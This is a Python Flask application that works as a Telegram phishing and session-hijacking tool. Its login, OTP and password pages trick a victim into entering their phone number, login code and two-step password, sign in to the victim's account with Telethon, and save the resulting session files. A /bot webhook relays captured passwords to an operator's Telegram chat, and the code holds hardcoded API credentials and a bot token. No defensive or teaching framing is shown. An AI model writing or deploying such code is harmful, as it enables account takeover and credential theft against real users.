import os
import re
import json
import time
import asyncio
import requests
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecret")

API_ID = 34946540
API_HASH = "7554a5e9dd52df527bfc39d8511413fd"

BOT_TOKEN = "8472101723:AAE34AbbXu0iIwUo-lZj-l98pFnqryqC5Yo"
CHAT_ID = "6352985888"

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

LAST_DATA = {}

def normalize(phone):
    return phone.replace(".session","").replace(".pending","").strip()

def save(phone, otp=None, password=None):
    phone = normalize(phone)
    if phone not in LAST_DATA:
        LAST_DATA[phone] = {"otp":None,"password":None}
    if otp: LAST_DATA[phone]["otp"]=otp
    if password: LAST_DATA[phone]["password"]=password

def get(phone):
    return LAST_DATA.get(normalize(phone),{"otp":None,"password":None})

# ================= BOT CALLBACK =================
@app.route("/bot", methods=["POST"])
def bot():
    data=request.get_json() or {}
    if "callback_query" not in data:
        return jsonify(ok=True)

    q=data["callback_query"]
    phone=q["data"].replace("cek_","")
    cid=q["message"]["chat"]["id"]
    info=get(phone)

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",data={
        "chat_id":cid,
        "text":f"OTP: {info['otp'] or '-'}\nPassword: {info['password'] or '-'}"
    })
    return jsonify(ok=True)

# ================= LOGIN =================
@app.route("/", methods=["GET","POST"])
def login():
    if request.method=="POST":
        phone=request.form["phone"]
        session["phone"]=phone

        path=os.path.join(SESSION_DIR, phone+".pending")

        async def run():
            client=TelegramClient(path, API_ID, API_HASH)
            await client.connect()
            sent=await client.send_code_request(phone)
            session["hash"]=sent.phone_code_hash
            await client.disconnect()

        asyncio.run(run())
        return redirect("/otp")

    return render_template("login.html")

@app.route("/otp", methods=["GET","POST"])
def otp():
    phone=session["phone"]

    if request.method=="POST":
        code=request.form["otp"]
        pending=os.path.join(SESSION_DIR, phone+".pending")

        async def run():
            client=TelegramClient(pending, API_ID, API_HASH)
            await client.connect()
            try:
                await client.sign_in(phone, code, session["hash"])
                await client.disconnect()
                os.rename(pending+".session", os.path.join(SESSION_DIR, phone+".session"))
                return True
            except SessionPasswordNeededError:
                return "pwd"
            except:
                return False

        r=asyncio.run(run())
        if r==True: return redirect("/success")
        if r=="pwd": return redirect("/password")
        flash("OTP salah")

    return render_template("otp.html")

@app.route("/password", methods=["GET","POST"])
def password():
    phone=session["phone"]

    if request.method=="POST":
        pwd=request.form["password"]
        pending=os.path.join(SESSION_DIR, phone+".pending")

        async def run():
            client=TelegramClient(pending, API_ID, API_HASH)
            await client.connect()
            try:
                await client.sign_in(password=pwd)
                await client.disconnect()
                os.rename(pending+".session", os.path.join(SESSION_DIR, phone+".session"))
                return True
            except:
                return False

        if asyncio.run(run()):
            save(phone,password=pwd)
            return redirect("/success")
        flash("Password salah")

    return render_template("password.html")

@app.route("/success")
def success():
    return render_template("success.html",phone=session["phone"])
